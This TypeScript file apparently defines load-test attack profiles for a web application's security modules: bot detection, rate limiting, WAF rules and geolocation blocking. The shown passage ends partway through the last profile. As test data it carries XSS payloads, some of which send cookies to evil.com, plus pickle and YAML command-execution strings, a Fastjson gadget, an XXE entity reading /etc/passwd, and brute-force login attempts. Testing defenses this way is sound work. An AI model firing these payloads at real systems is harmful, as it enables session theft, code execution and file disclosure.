/**
 * Security Module Load Tests
 * 
 * Targeted test profiles for each reorganized security folder:
 * - Bot: Credential stuffing, spam detection, session management
 * - Rate-Limiter: Burst detection, DoS/DDoS protection
 * - Rules: XSS and deserialization attack prevention
 * - Tracing: Geolocation blocking, IP tracking
 * - Core: Full stack legitimate and mixed traffic tests
 * 
 * All tests use lenient metrics for initial baseline establishment.
 * Thresholds can be tightened during optimization phase.
 */

import type { AttackProfile } from "./index.js";

/**
 * BOT_FOLDER_TEST
 * 
 * Tests the bot management module including:
 * - Credential stuffing detector
 * - Spam detector
 * - Session manager
 * - Traffic classifier
 * 
 * Lenient metrics: 50-70% block rate, < 200ms latency
 */
export const BOT_FOLDER_TEST: AttackProfile = {
  name: "Bot Folder Test",
  description: "Tests credential stuffing, spam detection, bot user agents - unique IPs per attacker",
  type: "credential-stuffing",
  requestsPerSecond: 80,
  duration: 60,
  concurrency: 25,
  pattern: {
    distribution: "constant",
    variance: 0.2,
  },
  requests: [
    // ================================================================
    // CREDENTIAL STUFFING - Different attackers (unique IPs) trying leaked credentials
    // Using FAKE blocked countries for attack simulation
    // ================================================================
    {
      method: "POST",
      path: "/api/login",
      headers: { 
        "User-Agent": "python-requests/2.28.0",
        "CF-IPCountry": "ZZ", // FAKE: Fakeland (blocked)
        "CF-Connecting-IP": "192.0.2.1",
      },
      body: { username: "victim1@example.com", password: "password123" },
    },
    {
      method: "POST",
      path: "/api/login",
      headers: { 
        "User-Agent": "python-requests/2.28.0",
        "CF-IPCountry": "XX", // FAKE: Testonia (blocked)
        "CF-Connecting-IP": "192.0.2.2",
      },
      body: { username: "victim2@example.com", password: "letmein" },
    },
    {
      method: "POST",
      path: "/api/login",
      headers: { 
        "User-Agent": "python-requests/2.28.0",
        "CF-IPCountry": "YY", // FAKE: Malwaristan (blocked)
        "CF-Connecting-IP": "192.0.2.3",
      },
      body: { username: "admin@company.com", password: "admin123" },
    },
    {
      method: "POST",
      path: "/api/login",
      headers: { 
        "User-Agent": "python-requests/2.28.0",
        "CF-IPCountry": "QQ", // FAKE: Suspectia (challenged)
        "CF-Connecting-IP": "192.0.2.4",
      },
      body: { username: "test@test.com", password: "test1234" },
    },
    
    // ================================================================
    // SPAM DETECTION - Spammers posting promotional content
    // ================================================================
    {
      method: "POST",
      path: "/api/login", // Using valid endpoint
      headers: { 
        "User-Agent": "curl/7.68.0",
        "CF-IPCountry": "WW", // FAKE: Botlandia (challenged)
        "CF-Connecting-IP": "192.0.2.10",
      },
      body: { 
        content: "Buy now! Free money guaranteed! Click here for amazing discounts!",
        author: "spammer"
      },
    },
    {
      method: "POST",
      path: "/api/login",
      headers: { 
        "User-Agent": "wget/1.20.3",
        "CF-IPCountry": "ZZ", // FAKE: Fakeland
        "CF-Connecting-IP": "192.0.2.11",
      },
      body: {
        content: "Earn online $$$! Limited time offer! Crypto guaranteed returns!",
        author: "bot123"
      },
    },
    {
      method: "POST",
      path: "/api/login",
      headers: { 
        "User-Agent": "python-requests/2.28.0",
        "CF-IPCountry": "XX", // FAKE: Testonia
        "CF-Connecting-IP": "192.0.2.12",
      },
      body: {
        title: "FREE MONEY",
        content: "Lose weight fast! Buy discount codes here! http://spam.link http://spam2.link",
      },
    },
    
    // ================================================================
    // BOT USER AGENTS - Automated tools scraping (unique IPs)
    // ================================================================
    {
      method: "GET",
      path: "/api/public",
      headers: { 
        "User-Agent": "python-requests/2.28.0",
        "CF-IPCountry": "YY", // FAKE: Malwaristan
        "CF-Connecting-IP": "192.0.2.20",
      },
    },
    {
      method: "GET",
      path: "/api/public",
      headers: { 
        "User-Agent": "curl/7.68.0",
        "CF-IPCountry": "QQ", // FAKE: Suspectia
        "CF-Connecting-IP": "192.0.2.21",
      },
    },
    {
      method: "GET",
      path: "/api/public",
      headers: { 
        "User-Agent": "wget/1.20.3",
        "CF-IPCountry": "WW", // FAKE: Botlandia
        "CF-Connecting-IP": "192.0.2.22",
      },
    },
    {
      method: "GET",
      path: "/api/public",
      headers: { 
        "User-Agent": "Scrapy/2.6.0",
        "CF-IPCountry": "ZZ", // FAKE: Fakeland
        "CF-Connecting-IP": "192.0.2.23",
      },
    },
    {
      method: "GET",
      path: "/api/public",
      headers: { 
        "User-Agent": "Go-http-client/1.1",
        "CF-IPCountry": "XX", // FAKE: Testonia
        "CF-Connecting-IP": "192.0.2.24",
      },
    },
    
    // ================================================================
    // SUSPICIOUS REQUESTS - Missing/empty headers
    // ================================================================
    {
      method: "GET",
      path: "/api/public",
      headers: {
        "CF-IPCountry": "YY", // FAKE: Malwaristan
        "CF-Connecting-IP": "192.0.2.30",
      }, // No user agent
    },
    {
      method: "GET",
      path: "/api/public",
      headers: { 
        "User-Agent": "",
        "CF-IPCountry": "QQ", // FAKE: Suspectia
        "CF-Connecting-IP": "192.0.2.31",
      }, // Empty user agent
    },
    
    // ================================================================
    // AUTOMATED REGISTRATION - Bot creating fake accounts
    // ================================================================
    {
      method: "POST",
      path: "/api/login", // Using valid endpoint
      headers: { 
        "User-Agent": "python-requests/2.28.0",
        "CF-IPCountry": "WW", // FAKE: Botlandia
        "CF-Connecting-IP": "192.0.2.40",
      },
      body: { email: "bot1@temp.com", password: "pass123" },
    },
    {
      method: "POST",
      path: "/api/login",
      headers: { 
        "User-Agent": "python-requests/2.28.0",
        "CF-IPCountry": "ZZ", // FAKE: Fakeland
        "CF-Connecting-IP": "192.0.2.41",
      },
      body: { email: "bot2@temp.com", password: "pass123" },
    },
  ],
  expected: {
    blockRate: 0.50, // Lenient: 50-70% expected block rate
    avgLatency: 200, // Lenient: up to 200ms
  },
};

/**
 * RATE_LIMITER_TEST
 * 
 * Tests the rate limiting module including:
 * - Burst detection
 * - DoS/DDoS protection
 * - Brute force prevention
 * - Web scraping limits
 * 
 * Lenient metrics: 60-80% block rate, < 150ms latency
 */
export const RATE_LIMITER_TEST: AttackProfile = {
  name: "Rate Limiter Test",
  description: "Tests burst detection, DoS patterns, brute force prevention - simulated distributed attack",
  type: "burst",
  requestsPerSecond: 500,
  duration: 30,
  concurrency: 50,
  pattern: {
    distribution: "exponential",
    burstSize: 200,
    rampUpTime: 2,
    variance: 0.15,
  },
  requests: [
    // ================================================================
    // HIGH-FREQUENCY BURST REQUESTS (DoS simulation)
    // Using unique IPs to simulate botnet distributed attack
    // Rate limiter should detect burst pattern regardless of IP
    // ================================================================
    {
      method: "GET",
      path: "/api/public",
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "CF-IPCountry": "US",
        "CF-Connecting-IP": "203.0.113.1",
      },
    },
    {
      method: "GET",
      path: "/api/status",
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "CF-IPCountry": "CA",
        "CF-Connecting-IP": "203.0.113.2",
      },
    },
    {
      method: "GET",
      path: "/api/rules",
      headers: {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "CF-IPCountry": "GB",
        "CF-Connecting-IP": "203.0.113.3",
      },
    },
    
    // ================================================================
    // BRUTE FORCE LOGIN ATTEMPTS - Single attacker guessing passwords
    // Same IP but different passwords (should be blocked by rate limiter)
    // ================================================================
    {
      method: "POST",
      path: "/api/login",
      headers: {
        "User-Agent": "python-requests/2.28.0",
        "CF-IPCountry": "ZZ", // FAKE: Fakeland (blocked)
        "CF-Connecting-IP": "192.0.2.50", // Same IP for brute force
      },
      body: { username: "admin", password: "password1" },
    },
    {
      method: "POST",
      path: "/api/login",
      headers: {
        "User-Agent": "python-requests/2.28.0",
        "CF-IPCountry": "ZZ", // FAKE: Fakeland
        "CF-Connecting-IP": "192.0.2.50", // Same IP
      },
      body: { username: "admin", password: "password2" },
    },
    {
      method: "POST",
      path: "/api/login",
      headers: {
        "User-Agent": "python-requests/2.28.0",
        "CF-IPCountry": "ZZ", // FAKE: Fakeland
        "CF-Connecting-IP": "192.0.2.50", // Same IP
      },
      body: { username: "admin", password: "password3" },
    },
    {
      method: "POST",
      path: "/api/login",
      headers: {
        "User-Agent": "python-requests/2.28.0",
        "CF-IPCountry": "ZZ", // FAKE: Fakeland
        "CF-Connecting-IP": "192.0.2.50", // Same IP
      },
      body: { username: "admin", password: "admin123" },
    },
    {
      method: "POST",
      path: "/api/login",
      headers: {
        "User-Agent": "python-requests/2.28.0",
        "CF-IPCountry": "XX", // FAKE: Testonia (blocked)
        "CF-Connecting-IP": "192.0.2.51",
      },
      body: { username: "root", password: "toor" },
    },
    
    // ================================================================
    // WEB SCRAPING PATTERNS - Distributed scraping botnet
    // Each scraper from different IP, rapid page enumeration
    // ================================================================
    {
      method: "GET",
      path: "/api/public",
      headers: {
        "User-Agent": "Scrapy/2.6.0",
        "CF-IPCountry": "YY", // FAKE: Malwaristan (blocked)
        "CF-Connecting-IP": "192.0.2.60",
      },
    },
    {
      method: "GET",
      path: "/api/public?page=1",
      headers: {
        "User-Agent": "Scrapy/2.6.0",
        "CF-IPCountry": "QQ", // FAKE: Suspectia (challenged)
        "CF-Connecting-IP": "192.0.2.61",
      },
    },
    {
      method: "GET",
      path: "/api/public?page=2",
      headers: {
        "User-Agent": "Scrapy/2.6.0",
        "CF-IPCountry": "WW", // FAKE: Botlandia (challenged)
        "CF-Connecting-IP": "192.0.2.62",
      },
    },
    {
      method: "GET",
      path: "/api/public?page=3",
      headers: {
        "User-Agent": "Scrapy/2.6.0",
        "CF-IPCountry": "ZZ", // FAKE: Fakeland
        "CF-Connecting-IP": "192.0.2.63",
      },
    },
    {
      method: "GET",
      path: "/api/public?limit=1000",
      headers: {
        "User-Agent": "Scrapy/2.6.0",
        "CF-IPCountry": "XX", // FAKE: Testonia
        "CF-Connecting-IP": "192.0.2.64",
      },
    },
    
    // ================================================================
    // SEARCH ABUSE - Automated search queries (enumeration)
    // ================================================================
    {
      method: "GET",
      path: "/api/public?q=test1",
      headers: {
        "User-Agent": "python-requests/2.28.0",
        "CF-IPCountry": "YY", // FAKE: Malwaristan
        "CF-Connecting-IP": "192.0.2.70",
      },
    },
    {
      method: "GET",
      path: "/api/public?q=test2",
      headers: {
        "User-Agent": "python-requests/2.28.0",
        "CF-IPCountry": "QQ", // FAKE: Suspectia
        "CF-Connecting-IP": "192.0.2.71",
      },
    },
    {
      method: "GET",
      path: "/api/public?q=test3",
      headers: {
        "User-Agent": "python-requests/2.28.0",
        "CF-IPCountry": "WW", // FAKE: Botlandia
        "CF-Connecting-IP": "192.0.2.72",
      },
    },
    
    // ================================================================
    // RESOURCE-INTENSIVE REQUESTS
    // ================================================================
    {
      method: "POST",
      path: "/api/login",
      headers: {
        "User-Agent": "curl/7.68.0",
        "CF-IPCountry": "ZZ", // FAKE: Fakeland
        "CF-Connecting-IP": "192.0.2.80",
      },
      body: { data: "x".repeat(1000) },
    },
  ],
  expected: {
    blockRate: 0.60, // Lenient: 60-80% expected block rate
    avgLatency: 150, // Lenient: up to 150ms
  },
};

/**
 * RULES_FOLDER_TEST
 * 
 * Tests the rules/WAF module including:
 * - XSS attack prevention
 * - Insecure deserialization protection
 * - Base64 encoded attack detection
 * 
 * Lenient metrics: 80-95% block rate, < 100ms latency
 */
export const RULES_FOLDER_TEST: AttackProfile = {
  name: "Rules Folder Test",
  description: "Tests XSS protection and insecure deserialization attack prevention using unique IPs per attack type",
  type: "sustained",
  requestsPerSecond: 100,
  duration: 45,
  concurrency: 20,
  pattern: {
    distribution: "constant",
    variance: 0.1,
  },
  requests: [
    // ================================================================
    // XSS ATTACKS - Each attacker from different IP (simulating distributed attack)
    // Using real countries - WAF should block these, not IP reputation
    // ================================================================
    
    // XSS - script injection (different IPs to avoid IP reputation auto-block)
    {
      method: "GET",
      path: "/api/public?q=<script>alert('xss')</script>",
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "CF-IPCountry": "US",
        "CF-Connecting-IP": "198.51.100.1",
      },
    },
    {
      method: "GET",
      path: "/api/public?q=<script>document.cookie</script>",
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "CF-IPCountry": "CA",
        "CF-Connecting-IP": "198.51.100.2",
      },
    },
    {
      method: "GET",
      path: "/api/public?query=<SCRIPT>alert(1)</SCRIPT>",
      headers: {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "CF-IPCountry": "GB",
        "CF-Connecting-IP": "198.51.100.3",
      },
    },
    
    // XSS - event handlers
    {
      method: "GET",
      path: "/api/public?input=<img src=x onerror=alert(1)>",
      headers: {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)",
        "CF-IPCountry": "DE",
        "CF-Connecting-IP": "198.51.100.4",
      },
    },
    {
      method: "GET",
      path: "/api/public?input=<body onload=alert('xss')>",
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "CF-IPCountry": "FR",
        "CF-Connecting-IP": "198.51.100.5",
      },
    },
    {
      method: "GET",
      path: "/api/public?input=<svg onload=alert(1)>",
      headers: {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "CF-IPCountry": "NL",
        "CF-Connecting-IP": "198.51.100.6",
      },
    },
    {
      method: "GET",
      path: "/api/public?input=<div onmouseover=alert(1)>",
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "CF-IPCountry": "SE",
        "CF-Connecting-IP": "198.51.100.7",
      },
    },
    
    // XSS - javascript: protocol
    {
      method: "GET",
      path: "/api/public?url=javascript:alert(1)",
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "CF-IPCountry": "JP",
        "CF-Connecting-IP": "198.51.100.8",
      },
    },
    {
      method: "GET",
      path: "/api/public?href=javascript:document.location='http://evil.com'",
      headers: {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "CF-IPCountry": "KR",
        "CF-Connecting-IP": "198.51.100.9",
      },
    },
    
    // XSS - data: protocol
    {
      method: "GET",
      path: "/api/public?src=data:text/html,<script>alert(1)</script>",
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "CF-IPCountry": "AU",
        "CF-Connecting-IP": "198.51.100.10",
      },
    },
    
    // XSS - vbscript
    {
      method: "GET",
      path: "/api/public?input=vbscript:msgbox(1)",
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "CF-IPCountry": "SG",
        "CF-Connecting-IP": "198.51.100.11",
      },
    },
    
    // XSS in POST body - use /api/login as valid endpoint
    {
      method: "POST",
      path: "/api/login",
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "CF-IPCountry": "US",
        "CF-Connecting-IP": "198.51.100.12",
      },
      body: { content: "<script>steal(document.cookie)</script>" },
    },
    {
      method: "POST",
      path: "/api/login",
      headers: {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "CF-IPCountry": "CA",
        "CF-Connecting-IP": "198.51.100.13",
      },
      body: { bio: "<img src=x onerror='fetch(`http://evil.com?c=`+document.cookie)'>" },
    },
    
    // ================================================================
    // INSECURE DESERIALIZATION ATTACKS - Different IPs per attack type
    // ================================================================
    
    // Java serialization magic bytes (base64)
    {
      method: "POST",
      path: "/api/login",
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "CF-IPCountry": "GB",
        "CF-Connecting-IP": "198.51.100.20",
      },
      body: { payload: "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA" }, // Java serialized object
    },
    {
      method: "POST",
      path: "/api/login",
      headers: {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)",
        "CF-IPCountry": "DE",
        "CF-Connecting-IP": "198.51.100.21",
      },
      body: { data: "ac ed 00 05" }, // Java magic bytes
    },
    
    // Python pickle
    {
      method: "POST",
      path: "/api/login",
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "CF-IPCountry": "FR",
        "CF-Connecting-IP": "198.51.100.22",
      },
      body: { object: "cos\nsystem\n(S'id'\ntR." }, // Pickle exploit
    },
    {
      method: "POST",
      path: "/api/login",
      headers: {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "CF-IPCountry": "NL",
        "CF-Connecting-IP": "198.51.100.23",
      },
      body: { payload: "__reduce__" }, // Pickle special method
    },
    {
      method: "POST",
      path: "/api/login",
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "CF-IPCountry": "SE",
        "CF-Connecting-IP": "198.51.100.24",
      },
      body: { data: "c__builtin__\neval\n" }, // Pickle dangerous
    },
    
    // PHP serialization
    {
      method: "POST",
      path: "/api/login",
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "CF-IPCountry": "JP",
        "CF-Connecting-IP": "198.51.100.25",
      },
      body: { data: "O:8:\"stdClass\":0:{}" }, // PHP serialized
    },
    {
      method: "POST",
      path: "/api/login",
      headers: {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "CF-IPCountry": "KR",
        "CF-Connecting-IP": "198.51.100.26",
      },
      body: { input: "a:1:{i:0;s:4:\"test\";}" }, // PHP array
    },
    
    // .NET deserialization
    {
      method: "POST",
      path: "/api/login",
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "CF-IPCountry": "AU",
        "CF-Connecting-IP": "198.51.100.27",
      },
      body: { payload: "TypeNameHandling" }, // .NET vulnerable setting
    },
    {
      method: "POST",
      path: "/api/login",
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "CF-IPCountry": "SG",
        "CF-Connecting-IP": "198.51.100.28",
      },
      body: { object: "$type" }, // .NET type indicator
    },
    
    // JSON/YAML gadgets
    {
      method: "POST",
      path: "/api/login",
      headers: {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "CF-IPCountry": "US",
        "CF-Connecting-IP": "198.51.100.29",
      },
      body: { "@type": "com.sun.rowset.JdbcRowSetImpl" }, // Fastjson gadget
    },
    {
      method: "POST",
      path: "/api/login",
      headers: {
        "Content-Type": "application/yaml",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "CF-IPCountry": "CA",
        "CF-Connecting-IP": "198.51.100.30",
      },
      body: { data: "!!python/object/apply:os.system ['id']" }, // YAML exploit
    },
    
    // Base64 encoded attacks
    {
      method: "GET",
      path: "/api/public?data=PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=", // base64(<script>alert('xss')</script>)
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "CF-IPCountry": "GB",
        "CF-Connecting-IP": "198.51.100.31",
      },
    },
    {
      method: "POST",
      path: "/api/login",
      headers: {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)",
        "CF-IPCountry": "DE",
        "CF-Connecting-IP": "198.51.100.32",
      },
      body: { encoded: "cm8wQUJYc3I=" }, // base64 Java serialization prefix
    },
    
    // XML External Entity (XXE)
    {
      method: "POST",
      path: "/api/login",
      headers: {
        "Content-Type": "application/xml",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "CF-IPCountry": "FR",
        "CF-Connecting-IP": "198.51.100.33",
      },
      body: { xml: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>" },
    },
  ],
  expected: {
    blockRate: 0.80, // Lenient: 80-95% expected block rate (WAF should block these)
    avgLatency: 100, // Lenient: up to 100ms
  },
};

/**
 * TRACING_FOLDER_TEST
 * 
 * Tests the tracing module including:
 * - Geolocation blocking for high-threat countries
 * - IP tracking and reputation
 * - Request tracing
 * 
 * Lenient metrics: 10-30% block rate, < 150ms latency
 */
export const TRACING_FOLDER_TEST: AttackProfile = {
  name: "Tracing Folder Test",
  description: "Tests geolocation blocking, IP tracking using FAKE test countries (ZZ, XX, YY, QQ, WW)",
  type: "sustained",
  requestsPerSecond: 50,
  duration: 60,
  concurrency: 15,
  pattern: {
    distribution: "wave",
    variance: 0.2,
  },
  requests: [
    // ================================================================
    // BLOCKED FAKE COUNTRIES (should be blocked by geolocation)
    // ZZ = Fakeland, XX = Testonia, YY = Malwaristan
    // NOTE: These are NOT real ISO country codes - for testing only
    // ================================================================
    {
      method: "GET",
      path: "/api/public",
      headers: { 
        "CF-IPCountry": "ZZ", // FAKE: Fakeland (blocked)
        "CF-Connecting-IP": "192.0.2.10",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
      },
    },
    {
      method: "GET",
      path: "/api/public",
      headers: { 
        "CF-IPCountry": "XX", // FAKE: Testonia (blocked)
        "CF-Connecting-IP": "192.0.2.20",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
      },
    },
    {
      method: "GET",
      path: "/api/public",
      headers: { 
        "CF-IPCountry": "YY", // FAKE: Malwaristan (blocked)
        "CF-Connecting-IP": "192.0.2.30",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
      },
    },
    
    // ================================================================
    // CHALLENGED FAKE COUNTRIES (allowed but flagged)
    // QQ = Suspectia, WW = Botlandia
    // NOTE: These are NOT real ISO country codes - for testing only
    // ================================================================
    {
      method: "GET",
      path: "/api/public",
      headers: { 
        "CF-IPCountry": "QQ", // FAKE: Suspectia (challenged)
        "CF-Connecting-IP": "192.0.2.40",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
      },
    },
    {
      method: "GET",
      path: "/api/public",
      headers: { 
        "CF-IPCountry": "WW", // FAKE: Botlandia (challenged)
        "CF-Connecting-IP": "192.0.2.50",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
      },
    },
    
    // ================================================================
    // LEGITIMATE REAL COUNTRIES (should pass geolocation check)
    // ================================================================
    // United States
    {
      method: "GET",
      path: "/api/public",
      headers: { 
        "CF-IPCountry": "US",
        "CF-Connecting-IP": "203.0.113.10",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
      },
    },
    // Canada
    {
      method: "GET",
      path: "/api/status",
      headers: { 
        "CF-IPCountry": "CA",
        "CF-Connecting-IP": "203.0.113.20",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
      },
    },
    // United Kingdom
    {
      method: "GET",
      path: "/api/public",
      headers: { 
        "CF-IPCountry": "GB",
        "CF-Connecting-IP": "203.0.113.30",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
      },
    },
    // Germany
    {
      method: "GET",
      path: "/api/public",
      headers: { 
        "CF-IPCountry": "DE",
        "CF-Connecting-IP": "203.0.113.40",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"
      },
    },
    // France
    {
      method: "GET",
      path: "/api/rules",
      headers: { 
        "CF-IPCountry": "FR",
        "CF-Connecting-IP": "203.0.113.50",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
      },
    },
    // Japan
    {
      method: "GET",
      path: "/api/public",
      headers: { 
        "CF-IPCountry": "JP",
        "CF-Connecting-IP": "203.0.113.60",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
      },
    },
    // South Korea
    {
      method: "GET",
      path: "/api/public",
      headers: { 
        "CF-IPCountry": "KR",
        "CF-Connecting-IP": "203.0.113.70",
        "User-Agent": "Mozilla/5.0 (Linux; Android 14)"
      },
    },
    // Australia
    {
      method: "GET",
      path: "/api/public",
      headers: { 
        "CF-IPCountry": "AU",
        "CF-Connecting-IP": "203.0.113.80",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)"
      },
    },
    
    // ================================================================
    // IP TRACKING TESTS - repeated requests from same simulated IP
    // ================================================================
    {
      method: "GET",
      path: "/api/public",
      headers: { 
        "CF-Connecting-IP": "203.0.113.100",
        "CF-IPCountry": "US",
        "User-Agent": "Mozilla/5.0"
      },
    },
    {
      method: "GET",
      path: "/api/public",
      headers: { 
        "CF-Connecting-IP": "203.0.113.100", // Same IP
        "CF-IPCountry": "US",
        "User-Agent": "Mozilla/5.0"
      },
    },
    {
      method: "GET",
      path: "/api/public",
      headers: { 
        "CF-Connecting-IP": "203.0.113.110",
        "CF-IPCountry": "GB",
        "User-Agent": "Mozilla/5.0"
      },
    },
  ],
  expected: {
    blockRate: 0.20, // Lenient: 15-25% block rate (blocked fake countries: ZZ, XX, YY)
    avgLatency: 150, // Lenient: up to 150ms
  },
};

/**
 * CORE_LEGITIMATE_TRAFFIC
 * 
 * Tests the full security stack with 100% legitimate traffic.
 * Validates that normal users are not incorrectly blocked.
 * 
 * Lenient metrics: 0-5% block rate (false positives), < 100ms latency
 */
export const CORE_LEGITIMATE_TRAFFIC: AttackProfile = {
  name: "Core Legitimate Traffic",
  description: "Full security stack test with 100% legitimate user traffic from real countries",
  type: "legitimate",
  requestsPerSecond: 50,
  duration: 30,
  concurrency: 10,
  pattern: {
    distribution: "wave", // Human-like browsing patterns
    variance: 0.35, // Natural variance in request timing
  },
  requests: [
    // === NORTH AMERICA ===
    // United States - Chrome on Windows
    {
      method: "GET",
      path: "/api/public",
      headers: { 
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "CF-IPCountry": "US",
        "CF-Connecting-IP": "203.0.113.10", // Simulated US IP
      },
    },
    {
      method: "GET",
      path: "/api/status",
      headers: { 
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "CF-IPCountry": "US",
        "CF-Connecting-IP": "203.0.113.11",
      },
    },
    // Canada - Safari on macOS
    {
      method: "GET",
      path: "/api/public",
      headers: { 
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
        "CF-IPCountry": "CA",
        "CF-Connecting-IP": "203.0.113.20",
      },
    },
    {
      method: "GET",
      path: "/",
      headers: { 
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
        "CF-IPCountry": "CA",
        "CF-Connecting-IP": "203.0.113.21",
      },
    },
    
    // === EUROPE ===
    // United Kingdom - Chrome
    {
      method: "GET",
      path: "/api/public",
      headers: { 
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
        "CF-IPCountry": "GB",
        "CF-Connecting-IP": "203.0.113.30",
      },
    },
    // Germany - Firefox on Linux
    {
      method: "GET",
      path: "/api/public",
      headers: { 
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "CF-IPCountry": "DE",
        "CF-Connecting-IP": "203.0.113.40",
      },
    },
    {
      method: "GET",
      path: "/api/status",
      headers: { 
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "CF-IPCountry": "DE",
        "CF-Connecting-IP": "203.0.113.41",
      },
    },
    // France - Safari
    {
      method: "GET",
      path: "/",
      headers: { 
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
        "CF-IPCountry": "FR",
        "CF-Connecting-IP": "203.0.113.50",
      },
    },
    // Netherlands - Edge
    {
      method: "GET",
      path: "/api/public",
      headers: { 
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edg/120.0.0.0",
        "CF-IPCountry": "NL",
        "CF-Connecting-IP": "203.0.113.60",
      },
    },
    // Sweden - Chrome
    {
      method: "GET",
      path: "/api/rules",
      headers: { 
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
        "CF-IPCountry": "SE",
        "CF-Connecting-IP": "203.0.113.70",
      },
    },
    
    // === ASIA PACIFIC ===
    // Japan - iPhone Safari
    {
      method: "GET",
      path: "/api/public",
      headers: { 
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Version/17.0 Mobile Safari/604.1",
        "CF-IPCountry": "JP",
        "CF-Connecting-IP": "203.0.113.80",
      },
    },
    {
      method: "GET",
      path: "/api/rules",
      headers: { 
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
        "CF-IPCountry": "JP",
        "CF-Connecting-IP": "203.0.113.81",
      },
    },
    // South Korea - Android Chrome
    {
      method: "GET",
      path: "/api/public",
      headers: { 
        "User-Agent": "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
        "CF-IPCountry": "KR",
        "CF-Connecting-IP": "203.0.113.90",
      },
    },
    // Australia - Chrome
    {
      method: "GET",
      path: "/api/public",
      headers: { 
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
        "CF-IPCountry": "AU",
        "CF-Connecting-IP": "203.0.113.100",
      },
    },
    // Singapore - Firefox
    {
